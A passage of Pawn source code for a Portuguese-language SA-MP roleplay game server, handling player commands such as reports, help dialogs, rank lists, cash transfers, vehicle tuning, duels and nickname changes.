				zone[MAX_ZONE_NAME]
			;
			GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
			SendClientMessage(playerid, COR_MEDICO, "Os(As) médicos(as) foram informados!");
			foreach(Player, i)
			{
				if(pInfo[i][Prof] == MEDICO || aInfo[i][Admin] == 1)
				{
					SendClientMessage(i, 0x00FF00AA, "	");
				    format(gstring, sizeof(gstring), "EMERGÊNCIA - Jogador(a): {FFFFFF}%s (ID %d)", PlayerName(playerid), playerid);
					SendClientMessage(i, COR_ERRO, gstring);
					format(gstring, sizeof(gstring), "MOTIVO: {FF0000}%s", result);
					SendClientMessage(i, 0x00FF00AA, gstring);
					format(gstring, sizeof(gstring), "LOCAL: {FFFFFF}%s", zone);
					SendClientMessage(i, AZUL_WE, gstring);
				}
			}
		}
		return 1;
	}
	if(!strcmp(cmd, "/reportar", true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
      	{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /Reportar [ID] [Motivo]");
			return 1;
      	}
        new
			id = strval(tmp)
		;
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[64];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = cmdtext[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		if(!strlen(result))
      	{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /Reportar [ID] [Motivo]");
			return 1;
      	}
      	else
      	{
			SendClientMessage(playerid, 0xCCFFFFAA, "Denúncia enviada com sucesso a staff online!");
			format(string, sizeof(string), "O(A) jogador(a) %s [%d] reportou %s [%d] pelo motivo: %s", PlayerName(playerid), playerid, PlayerName(id), id, result);
			Reports(string);
			foreach(Player, i)
			{
				if(aInfo[i][Admin] == 1 || aInfo[i][Moderador] == 1 || aInfo[i][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1)
				{
					SendClientMessage(i, COR_AMARELO, string);
				}
			}
			return 1;
		}
	}
	if(!strcmp(cmd, "/comandos", true) || !strcmp(cmd, "/cmds", true))
	{
		new
	        stg[1500]
		;
    	format(gStr, sizeof(gStr), "{1E90FF}/Ajuda\n/192\n/MeuNivel\n/RG\n/Profissao\n/GPS\n/Tutorial");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n/Admins ou /Mods\n/Creditos\n/Ausentes\n/Transferir");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n/Veiculo Trancar\n/Veiculo Destrancar\n/Dormir\n/Bola\n/Policiais");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n/sCasamento\n/Patentes - {FFF000}/Cargos {1E90FF}- {FF1E1E}/Assaltos");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n/Duvida - {FF1E1E}Use caso tenha uma dúvida.");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n/Reportar - {FF1E1E}Use em caso de bugs, ou cheaters.");
	    strcat(stg, gStr);
		ShowPlayerDialog(playerid, 1448, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Comandos do servidor", stg, "Fechar", "");
	    return 1;
	}
	if(!strcmp(cmd, "/motivos", true))
	{
		new
	        stg[1500]
		;
    	format(gStr, sizeof(gStr), "{1E90FF}1. Tentativa de Homicídio: {FF1E1E}TH\n{1E90FF}2. Tráfico de Drogas: {FF1E1E}TD\n{1E90FF}3. Tráfico de Armas: {FF1E1E}TA");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n4. Porte ilegal de armas: {FF1E1E}PIA\n{1E90FF}5. Roubo de veículo: {FF1E1E}RV\n{1E90FF}6. Cúmplice de fuga: {FF1E1E}CF");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n7. Desacato a autoridade: {FF1E1E}DA\n{1E90FF}8. Desobediência as ordens policias: {FF1E1E}DOP");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\n9. Invasão de espaço privado: {FF1E1E}IEP\n{1E90FF}10. Atentado terrorista: {FF1E1E}AT");
	    strcat(stg, gStr);
	    format(gStr, sizeof(gStr), "{1E90FF}\nCaso seja pego(a) usando o /Procurar para outro motivo, será punido(a)!");
	    strcat(stg, gStr);
		ShowPlayerDialog(playerid, D_MOTIVOS, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Motivos do /Procurar", stg, "Fechar", "");
	    return 1;
	}
	if(!strcmp(cmd, "/patentes", true))
	{
		new
	        stg[1500],
	        gstgr[1500]
		;
    	format(gstgr, sizeof(gstgr), "{1E90FF}Patentes policiais (por presos)\n{FFFFFF}0: {1E90FF}Recruta\n{FFFFFF}20: {1E90FF}Sargento\n{FFFFFF}60: {1E90FF}Subtenente\n{FFFFFF}100: {1E90FF}Tenente\n{FFFFFF}170: {1E90FF}Capitão");
	    strcat(stg, gstgr);
  	    format(gstgr, sizeof(gstgr), "\n{FFFFFF}270: {1E90FF}Major\n{FFFFFF}390: {1E90FF}Coronel\n{FFFFFF}500: {1E90FF}Comandante\n{FFFFFF}800: {1E90FF}General\n{FFFFFF}1500: {1E90FF}Marechal");
	    strcat(stg, gstgr);
	    format(gstgr, sizeof(gstgr), "{1E90FF}\nCargos: /Cargos\nNíveis de assaltante: /Assaltos");
	    strcat(stg, gstgr);
		ShowPlayerDialog(playerid, D_PATENTES, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Patentes policiais", stg, "Fechar", "");
	    return 1;
	}
	if(!strcmp(cmd, "/cargos", true))
	{
		new
	        stg[1500],
	        gstgr[1500]
		;
    	format(gstgr, sizeof(gstgr), "{1E90FF}Cargos (por cargas/transportes)\n{FFFFFF}0: {FFF000}Novato(a)\n{FFFFFF}75: {FFF000}Intermediário\n{FFFFFF}200: {FFF000}Experiênte");
	    strcat(stg, gstgr);
	    format(gstgr, sizeof(gstgr), "{1E90FF}\nPatentes policiais: /Patentes\nNíveis de assaltante: /Assaltos");
	    strcat(stg, gstgr);
		ShowPlayerDialog(playerid, D_CARGOS, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Cargos (Transportes)", stg, "Fechar", "");
	    return 1;
	}
	if(!strcmp(cmd, "/assaltos", true))
	{
		new
	        stg[1500],
	        gstgr[1500]
		;
    	format(gstgr, sizeof(gstgr), "{FF1E1E}Níveis de assaltante (por assaltos)\n{FFFFFF}0: {FF1E1E}Novato(a)\n{FFFFFF}50: {FF1E1E}Intermediário\n{FFFFFF}150: {FF1E1E}Experiênte\n{FFFFFF}300: {FF1E1E}Veterano\n{FFFFFF}500: {FF1E1E}Profissional");
	    strcat(stg, gstgr);
	    format(gstgr, sizeof(gstgr), "{1E90FF}\nPatentes policiais: /Patentes\nCargos: /Cargos");
	    strcat(stg, gstgr);
		ShowPlayerDialog(playerid, D_ASSALTOS, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Níveis de assaltante", stg, "Fechar", "");
	    return 1;
	}
	if(!strcmp(cmdtext, "/forum", true))
	{
		SendClientMessage(playerid, AZUL_WE, "Acesse: {FFFFFF}forumwe.vivagamesonline.com");
		return 1;
	}
	if(!strcmp(cmdtext, "/ajuda", true))
	{
		ShowPlayerDialog(playerid, D_AJUDA, DIALOG_STYLE_LIST, "AJUDA", "Servidor\nCréditos\nAdministração e Moderação\nRegras\nComandos\nNível\nBasquete\nEventos\nLugares", "Ver", "Sair");
		return 1;
	}
	if(!strcmp(cmdtext, "/regras", true))
	{
		new
			stg[1500]
		;
		format(gstring, sizeof(gstring), "{1E90FF} Jamais cometa DM (Homicídio sem motivo) em locais públicos e interiores,");
	    strcat(stg, gstring);
	    format(gstring, sizeof(gstring), "\n{1E90FF}sendo eles: Agências de empregos, bancos, prefeituras, hospitais, spawn de profissões, dentre outros.");
	    strcat(stg, gstring);
		format(gstring, sizeof(gstring), "\n\n{FF1E1E} Drive-by (atirar de um veículo contra um(a) jogador(a) apé) é proibido, sendo assim");
        strcat(stg, gstring);
        format(gstring, sizeof(gstring), "\n{FF1E1E}aquele que cometer a infração citada será devidamente punido. (OBS. Atirar de veículo contra veículo é permitido)");
	    strcat(stg, gstring);
	    format(gstring, sizeof(gstring), "\n\n{1E90FF} O insulto, desrespeito e racismo é proibido e totalmente intolerável, sempre procure respeitar e aceitar.");
	    strcat(stg, gstring);
        format(gstring, sizeof(gstring), "\n\n{FF1E1E} Não peça um cargo na Equipe {1E90FF}WE{FF1E1E}, quanto mais insistir, menos será sua chance de conseguir uma vaga,");
        strcat(stg, gstring);
	    format(gstring, sizeof(gstring), "\n{FF1E1E}caso queira fazer parte da mesma, seja honesto, humilde, ajude os outros jogadores e procure manter a ordem.");
        strcat(stg, gstring);
        format(gstring, sizeof(gstring), "\n\n{1E90FF} O uso de cheater e programas que lhe dê vantagens é totalmente proibido, sujeito a banimento permanente.");
	    strcat(stg, gstring);
		ShowPlayerDialog(playerid, 1448, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Regras Básicas - World Evolution RPG ", stg, "OK", "Avançar");
		return 1;
	}
	if(!strcmp(cmdtext, "/creditos"))
	{
		SendClientMessage(playerid, 0xFFFFFFAA, " [Créditos] ");
		SendClientMessage(playerid, 0xFFFFFFAA, "Para visualizar os créditos do servidor, use: /Ajuda > Créditos.");
 		SendClientMessage(playerid, 0xFFFFFFAA, " [Créditos] ");
		return 1;
	}
	if(!strcmp(cmd, "/vercomandos", true))
	{
		if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
			    SendClientMessage(playerid, COR_ERRO, "Uso válido: /VerComandos [ON/OFF]");
				return 1;
			}
			if(!strcmp(tmp, "on", true))
			{
				if(vercmds[playerid] == 0)
				{
				    SendClientMessage(playerid, 0x1E90FFAA, "Agora você pode visualizar os comandos que os jogadores digitam.");
					vercmds[playerid] = 1;
					return 1;
				}
			}
			else if(!strcmp(tmp, "off", true))
			{
				if(vercmds[playerid] == 1)
				{
				    SendClientMessage(playerid, 0x1E90FFAA, "Você ocultou a visualização de comandos.");
					vercmds[playerid] = 0;
					return 1;
				}
			}
		}
		else
		{
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/transferir", true))
	{
	    if(pInfo[playerid][Level] < 10)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem nível o suficiente para fazer transferências. Nível mínimo: 10.");
	        return 1;
	    }
		tmp = strtok(cmdtext, idx) ;
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /Transferir [ID] [Quantia]");
			return 1;
		}
		new
			id = strval(tmp)
		;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /Transferir [ID] [Quantia]");
			return 1;
		}
		new
			moneys = strval(tmp)
		;
		if(id == playerid)
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não pode fazer transferência para você mesmo(a)!");
		    return 1;
		}
  		if(GetDistanceBetweenPlayers(playerid, id) > 20)
    	{
			SendClientMessage(playerid, COR_ERRO, "Você está muito longe da pessoa que deseja trânsferir, chegue mais perto!");
			return 1;
   		}
		if(!IsPlayerConnected(id))
		{
			SendClientMessage(playerid, COR_BRANCO, "Jogador(a) não conectado(a)!");
			return 1;
		}
		if(GetPlayerCash(playerid) < moneys)
		{
			SendClientMessage(playerid, COR_BRANCO, "Você não tem essa quantia em mãos!");
			return 1;
		}
		if(moneys < 1 || GetPlayerCash(playerid) < moneys)
 		{
			SendClientMessage(playerid, COR_BRANCO, "Quantia inválida!");
			return 1;
		}
		format(gstring, sizeof(gstring), "Quantia de {215921}R$%d {FFFFFF}em dinheiro transferida com sucesso para {1E90FF}%s{FFFFFF}.", moneys, PlayerName(id));
		SendClientMessage(playerid, 0x215921AA, gstring);
		format(gstring, sizeof(gstring), "O(A) jogador(a) {1E90FF}%s {FFFFFF}lhe transferiu {215921}R$%d {FFFFFF}em dinheiro.", PlayerName(playerid), moneys);
		SendClientMessage(id, 0x215921AA, gstring);
		format(gstring, sizeof(gstring), "{FFFFFF}{1E90FF}%s {FFFFFF}transferiu {215921}R$%d {FFFFFF}reais para {1E90FF}%s{FFFFFF}.", PlayerName(playerid), moneys, PlayerName(id));
 		sGivePlayerCash(playerid, -moneys);
		sGivePlayerCash(id, moneys);
		Transferencias(gstring);
		return 1;
	}
	if(!strcmp(cmd, "/liberarnick", true))
	{
		if(WE_GetInt(f(playerid), "AdminL") == 1)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /liberarnick [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
			if(IsPlayerConnected(id))
			{
			    SendClientFormat(playerid, AZUL_WE, "Você liberou '%s' para poder mudar de nick.", PlayerName(id));
				SendClientMessage(playerid, 0x00FF00FF, "{FF0000}[NICK] {00FF00}Você liberou o(a) jogador(a) para trocar de nick!");
   				format(gstring, sizeof(gstring), "{FF0000}[NICK] {00FF00}%s lhe deu permissão para trocar seu nick!", PlayerName(playerid));
			    SendClientMessage(id, 0x00FF00AA, gstring);
				SetTimerEx("TempoComprarNick", 60000, false, "i", id);
				N_Liberado[id] = 1;
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
  		}
		else
		{
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
            return 1;
		}
	}
	if(!strcmp(cmdtext, "/tunar", true))
	{
	    if(PlayerToPoint(10.0, playerid, 1708.7620, -1793.4124, 14.6142))
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && EUmCarro(GetPlayerVehicleID(playerid)) && EUmCaminhao(GetPlayerVehicleID(playerid)))
  			{
    			for(new c; c < sizeof(cInfo); c++)
				{
     				if(GetPlayerVehicleID(playerid) == cInfo[c][HouseCar])
					{
		        		if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
						{
						 	new vStr[128];
						    format(vStr, sizeof(vStr), "CarrosTunados/vCasa%d.ini", CasaInfo[c][Numero]);
							if(!fexist(vStr)) WE_CreateFile(vStr);
						    new vehiclemodel = GetVehicleModel(GetPlayerVehicleID(playerid));
							new stringbig[2048], component;
							ccount[playerid] = 1;

						    while(GetVehicleCompatibleUpgrades(vehiclemodel, ccount[playerid], component))
						    {
								if(ccount[playerid] <= MAX_COMP)
								{
									if(ccount[playerid] == 1)
									{
										if(WE_GetInt(vStr, componenteNome(component)) == component)
									    {
									        format(stringbig, sizeof(stringbig), "%s\n%s {1E90FF}APLICADO", stringbig, GetComponentName(component));
									    }
									    else
									    {
											format(stringbig, sizeof(stringbig), "%s", GetComponentName(component));
										}
									}
									else
									{
									    if(WE_GetInt(vStr, componenteNome(component)) == component)
									    {
									        format(stringbig, sizeof(stringbig), "%s\n%s {1E90FF}APLICADO", stringbig, GetComponentName(component));
									    }
									    else
									    {
											format(stringbig, sizeof(stringbig), "%s\n%s", stringbig, GetComponentName(component));
										}
									}
									componentsid[playerid][ccount[playerid] - 1] = component;
									ccount[playerid] ++;
								}
								else break;
						    }
							new
								title[80]
							;
							format(title, sizeof(title), "Tunnings para {FF6400}%s", vNome[vehiclemodel - 400]);
							ShowPlayerDialog(playerid, DIALOGID, DIALOG_STYLE_LIST, title, stringbig, "Tunar", "Sair");
						}
					}
				}
   			}
   			else
   			{
   				SendClientMessage(playerid, COR_ERRO, "Você não está em um carro!");
   			}
   			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está Oficina de Tunning!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/remover", true))
	{
	    if(PlayerToPoint(10.0, playerid, 1708.7620, -1793.4124, 14.6142))
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER && EUmCarro(GetPlayerVehicleID(playerid)) && EUmCaminhao(GetPlayerVehicleID(playerid)))
  			{
    			for(new c; c < sizeof(cInfo); c++)
				{
     				if(GetPlayerVehicleID(playerid) == cInfo[c][HouseCar])
					{
		        		if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
						{
						 	new vStr[128];
						    format(vStr, sizeof(vStr), "CarrosTunados/vCasa%d.ini", CasaInfo[c][Numero]);
							if(!fexist(vStr)) WE_CreateFile(vStr);
						    new vehiclemodel = GetVehicleModel(GetPlayerVehicleID(playerid));
							new stringbig[2048], component;
							ccount[playerid] = 1;

						    while(GetVehicleCompatibleUpgrades(vehiclemodel, ccount[playerid], component))
						    {
								if(ccount[playerid] <= MAX_COMP)
								{
									if(ccount[playerid] == 1)
									{
										if(WE_GetInt(vStr, componenteNome(component)) == component)
									    {
									        format(stringbig, sizeof(stringbig), "%s\n%s {FF1E1E}REMOVER", stringbig, GetComponentName(component));
									    }
									    else
									    {
											format(stringbig, sizeof(stringbig), "%s", GetComponentName(component));
										}
									}
									else
									{
									    if(WE_GetInt(vStr, componenteNome(component)) == component)
									    {
									        format(stringbig, sizeof(stringbig), "%s\n%s {FF1E1E}REMOVER", stringbig, GetComponentName(component));
									    }
									    else
									    {
											format(stringbig, sizeof(stringbig), "%s\n%s", stringbig, GetComponentName(component));
										}
									}
									componentsid[playerid][ccount[playerid] - 1] = component;
									ccount[playerid] ++;
								}
								else break;
						    }
							new
								title[80]
							;
							format(title, sizeof(title), "Tunnings para {FF6400}%s", vNome[vehiclemodel - 400]);
							ShowPlayerDialog(playerid, DIALOGID+1, DIALOG_STYLE_LIST, title, stringbig, "Remover", "Sair");
						}
					}
				}
   			}
   			else
   			{
   				SendClientMessage(playerid, COR_ERRO, "Você não está em um carro!");
   			}
   			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está Oficina de Tunning!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/veiculoestacionar", true))
	{
		if(IsPlayerInAnyVehicle(playerid))
  		{
  		    if(Estacionou[playerid] == 1)
  		    {
  		        SendClientMessage(playerid, COR_ERRO, "Você já estacionou uma vez, somente relogando para estacionar novamente!");
  		        return 1;
  		    }
    		for(new c; c < sizeof(cInfo); c++)
			{
     			if(GetPlayerVehicleID(playerid) == cInfo[c][HouseCar])
				{
		        	if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), true))
					{
					    format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
					    new
							Float:cHousex, Float:cHousey, Float:cHousez, Float:cHousea
						;
						GetPlayerPos(playerid, cHousex, cHousey, cHousez);
						GetVehicleZAngle(GetPlayerVehicleID(playerid), cHousea);

						WE_SetFloat(hFile, "newCarX", cHousex);
						WE_SetFloat(hFile, "newCarY", cHousey);
						WE_SetFloat(hFile, "newCarZ", cHousez);
						WE_SetFloat(hFile, "newCarAng", cHousea);
						WE_SetInt(hFile, "newSpawn", 1);
						cInfo[CasaInfo[c][Numero]][NewCar] = 1;
						SetTimerEx("NewCarH", 2000, false, "d", CasaInfo[c][Numero]);
						SendClientMessage(playerid, COR_AMARELO, "Você definiu o veículo de sua casa para dar spawn neste local.");
						Estacionou[playerid] = 1;
					}
					else if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) deste veículo!");
					}
					return 1;
				}
			}
		}
		else
   		{
   			SendClientMessage(playerid, COR_ERRO, "Você não está no seu veículo!");
   		}
		return 1;
	}
	if(!strcmp(cmd, "/duelo", true))
	{

		tmp = strtok(cmdtext, idx);//DUELO
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Duelo [Entrar/Sair]");
			return 1;
		}
		if(!strcmp(tmp, "entrar", true))
		{
		 	new
				Float:health
			;
			GetPlayerHealth(playerid, health);
		    if(health < 50.0)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você só pode entrar no duelo com a vida acima de 50!");
		        return 1;
		    }
		    if(ArenaDuelo[playerid] == true)
		    {
		        SendClientMessage(playerid, COR_ERRO, "Você já está dentro da arena de duelos!");
		        return 1;
			}
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, 2131.4861, -973.9576, 59.7856))
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está na entrada do duelo localizado na Área de DM!");
	        	return 1;
			}
			if(DentroDuelo == 2)
			{
				format(gStr, sizeof(gStr), "(Arena DM) Arena já ocupada por '%s' e '%s' espere o duelo entre eles terminar.", PlayerName(p1_), PlayerName(p2_));
				SendClientMessage(playerid, COR_AMARELO, gStr);
			 	return 1;
			}
			new
			    Float:d_Life
			;
			GetPlayerHealth(playerid, d_Life);
			if(ArenaDuelo[playerid] == false)
			{
			    ResetPlayerWeapons(playerid);
				if(DentroDuelo == 0)
				{
					DentroDuelo = 1;
					IDX1 = playerid;
					p1_ = playerid;
					ArenaDuelo[playerid] = true;
					SetPlayerHealth(playerid, 100);
	       			SetPlayerPos(playerid, 1468.1580,-1085.3899,213.3828);
	    			SetPlayerFacingAngle(playerid, 40.4450);
	    			SetCameraBehindPlayer(playerid);
					TogglePlayerControllable(playerid, false);
					LifeDuelo[playerid] = d_Life;
					return 1;
				}
				else if(DentroDuelo == 1)
				{
					ArenaDuelo[playerid] = true;
					DentroDuelo = 2;
					p2_ = playerid;
					SetPlayerHealth(playerid, 100);
					TogglePlayerControllable(playerid, false);
				   	SetPlayerPos(playerid, 1436.1406,-1050.2604,213.3828);
					SetPlayerFacingAngle(playerid, 222.4934);
				    SetCameraBehindPlayer(playerid);
					TempoCounTD[playerid] = 5;
					TempoCounTD[IDX1] = 5;
					TimerDuelo[playerid] = SetTimerEx("ContagemDuelo", 1000, true, "i", playerid);
					TimerDuelo[IDX1] = SetTimerEx("ContagemDuelo", 1000, true, "i", IDX1);
					LifeDuelo[playerid] = d_Life;
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Você já está na arena de duelos!");
    			return 1;
			}
		}
		else if(!strcmp(tmp, "sair", true))
		{
			if(ArenaDuelo[playerid] == true)
			{
			    if(playerid == p1_)
			    {
			        if(ArenaDuelo[p2_] == true)
			        {
						format(gStr, sizeof(gStr), "(Arena DM) '%s' desistiu de duelar com você.", PlayerName(p1_));
						SendClientMessage(p2_, COR_AMARELO, gStr);
					}
	 				else
	 				{
	 				    SendClientMessage(p2_, COR_AMARELO, "Você desistiu de duelar!");
	 				}
					DentroDuelo = 0;
					IDX1 = -1;
					KillTimer(TimerDuelo[p1_]);
			   		SetPlayerPos(p1_, 2131.4861, -973.9576, 59.7856);
			      	SetPlayerFacingAngle(p1_, 2.1799);
					SetCameraBehindPlayer(p1_);
					ArenaDuelo[p1_] = false;
					TogglePlayerControllable(p1_, true);
					ResetPlayerWeapons(p1_);
					SetPlayerHealth(playerid, LifeDuelo[playerid]);
					if(ArenaDuelo[p2_] == true)
					{
						SetPlayerPos(p2_, 2131.4861, -973.9576, 59.7856);
					   	SetPlayerFacingAngle(p2_, 2.1799);
						SetCameraBehindPlayer(p2_);
						ArenaDuelo[p2_] = false;
						TogglePlayerControllable(p2_, true);
						KillTimer(TimerDuelo[p2_]);
						ResetPlayerWeapons(p2_);
						SetPlayerHealth(playerid, LifeDuelo[p2_]);
						return 1;
					}
				}
				else if(playerid == p2_)
			    {
			        if(ArenaDuelo[p1_] == true)
			        {
						format(gStr, sizeof(gStr), "(Arena DM) Você desistiu de duelar com '%s'.", PlayerName(p1_));
						SendClientMessage(p2_, 0xCCCC99FF, gStr);
						format(gStr, sizeof(gStr), "(Arena DM) '%s' desistiu de duelar com você.", PlayerName(p2_));
						SendClientMessage(p1_, 0xCCCC99FF, gStr);
					}
	 				else
	 				{
	 				    SendClientMessage(p2_, COR_AMARELO, "Você desistiu de duelar!");
	 				}
					DentroDuelo = 0;
					IDX1 = -1;
					KillTimer(TimerDuelo[p2_]);
			   		SetPlayerPos(p2_, 2131.4861, -973.9576, 59.7856);
			      	SetPlayerFacingAngle(p2_, 2.1799);
					SetCameraBehindPlayer(p2_);
					ArenaDuelo[p2_] = false;
					TogglePlayerControllable(p2_, true);
					ResetPlayerWeapons(p2_);
					SetPlayerHealth(playerid, LifeDuelo[playerid]);
					if(ArenaDuelo[p1_] == true)
					{
						SetPlayerPos(p1_, 2131.4861, -973.9576, 59.7856);
					   	SetPlayerFacingAngle(p1_, 2.1799);
						SetCameraBehindPlayer(p1_);
						ArenaDuelo[p1_] = false;
						TogglePlayerControllable(p1_, true);
						KillTimer(TimerDuelo[p1_]);
						ResetPlayerWeapons(p1_);
						SetPlayerHealth(playerid, LifeDuelo[p1_]);
						return 1;
					}
				}
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está na arena de duelos!");
			    return 1;
			}
		}//DUELO
		return 1;
	}
	if(!strcmp(cmd, "/pinglimite", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			new
				P_LIMITE
			;
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /PingLimite [Limite]");
				return 1;
			}
			P_LIMITE = strval(tmp);
    		foreach(Player, i)
			{
				format(gstring, sizeof(gstring), "O(A) administrador(a) %s o limite de ping para %d", PlayerName(playerid), P_LIMITE);
				SendClientMessageToAll(0x1E90FFAA, gstring);
				LIMITE_PING = P_LIMITE;
				return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/mudarnick", true))// COMEÇO TROCA DE NICK
	{
	    if(aInfo[playerid][Admin] == 0)
	    {
            SendClientMessage(playerid, COR_ERRO, "Somente administradores podem trocar nick!");
	        return 1;
		}
	    if(N_Liberado[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você precisa ter autorização de um(a) administrador(a) para mudar de nick!");
	        return 1;
	    }
		tmp = strtok(cmdtext, idx);
		if(strlen(tmp) == 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /MudarNick [NovoNick]");
			return 1;
		}
		if(strlen(tmp) > MAX_PLAYER_NAME)
		{
			SendClientMessage(playerid, COR_ERRO, "Limite de caractéres é de 24!");
			return 1;
		}
		format(gFile, sizeof(gFile), "Contas/%s.ini", tmp);
		format(gStr, sizeof(gStr), "Contas/%s.ini", PlayerName(playerid));
		new
			HouseID,
			PropyID,
			SpawnID = WE_GetInt(gStr, "Spawn")
		;
		if(!fexist(gFile))
		{
		 	if(WE_GetInt(gStr, "Casa") > -1)
			{
			    new
					CasaID = WE_GetInt(gStr, "Casa")
				;
				format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaID) ;
				HouseID = CasaID;
				if(fexist(hFile))
				{
				    if(strcmp(WE_GetString(hFile, "Proprietario"), PlayerName(playerid), true) == 0)
				    {
						WE_SetString(hFile, "Proprietario", tmp);
						format(CasaInfo[CasaID][Proprietario], 50, WE_GetString(hFile, "Proprietario"));
					}
				}
			}
			if(WE_GetInt(gStr, "MorandoID") > -1)
			{
  			    new
					MorandoID = WE_GetInt(gStr, "MorandoID")
				;
				format(hFile, sizeof(hFile), "Casas/casa%d.ini", MorandoID);
				HouseID = MorandoID;
				if(fexist(hFile))
				{
				    if(strcmp(WE_GetString(hFile, "Morador"), PlayerName(playerid), true) == 0)
				    {
						WE_SetString(hFile, "Morador", tmp);
						format(CasaInfo[MorandoID][Morador], 50, WE_GetString(hFile, "Morador"));
					}
				    if(strcmp(WE_GetString(hFile, "Morador2"), PlayerName(playerid), true) == 0)
				    {
						WE_SetString(hFile, "Morador2", tmp);
						format(CasaInfo[MorandoID][Morador2], 50, WE_GetString(hFile, "Morador"));
					}
				    if(strcmp(WE_GetString(hFile, "Morador3"), PlayerName(playerid), true) == 0)
				    {
						WE_SetString(hFile, "Morador3", tmp);
						format(CasaInfo[MorandoID][Morador3], 50, WE_GetString(hFile, "Morador"));
					}
				}
			}
   			new
				EmpreID = WE_GetInt(gStr, "EmpresaID")
			;
			if(EmpreID > 0)
			{
			    new
					StrG[128],
					m_Label[128]
				;
				PropyID = EmpreID;
				if(strcmp(EmpresaInfo[EmpreID][Proprietario], PlayerName(playerid), true) == 0)
				{
				    format(StrG, sizeof(StrG), "Empresas/Empresa%d.ini", EmpreID);
					WE_SetString(StrG, "Proprietario", tmp);
					format(EmpresaInfo[EmpreID][Proprietario], 64, tmp);
             		Delete3DTextLabel(EmpresaInfo[EmpreID][TxTt]);
				  	format(m_Label, sizeof(m_Label), "Empresa (%s)\nDono: %s\nSub Nome: %s\nN°%d", EmpresaInfo[EmpreID][EmpresaNome], tmp, EmpresaInfo[PropyID][EmpresaNome], PropyID);
				  	EmpresaInfo[EmpreID][TxTt] = Create3DTextLabel(m_Label, COR_AMARELO, EmpresaInfo[EmpreID][PickupX], EmpresaInfo[EmpreID][PickupY], EmpresaInfo[EmpreID][PickupZ]+0.75, 20.0,0,1);
				}
			}
			if(WE_GetInt(gStr, "Contratado") != 0)
			{
			    new
					eid[128]
				;
				format(eid, sizeof(eid), "Empresas/Empresa%d.ini", WE_GetInt(gStr, "Contratado"));

				if(strcmp(EmpresaInfo[WE_GetInt(gStr, "Contratado")][Funcionario1], PlayerName(playerid), true) == 0)
				{
				    format(EmpresaInfo[WE_GetInt(gStr, "Contratado")][Funcionario1], 64, tmp);
				    WE_SetString(eid, "Funcionario1", tmp);
				}
				if(strcmp(EmpresaInfo[WE_GetInt(gStr, "Contratado")][Funcionario2], PlayerName(playerid), true) == 0)
				{
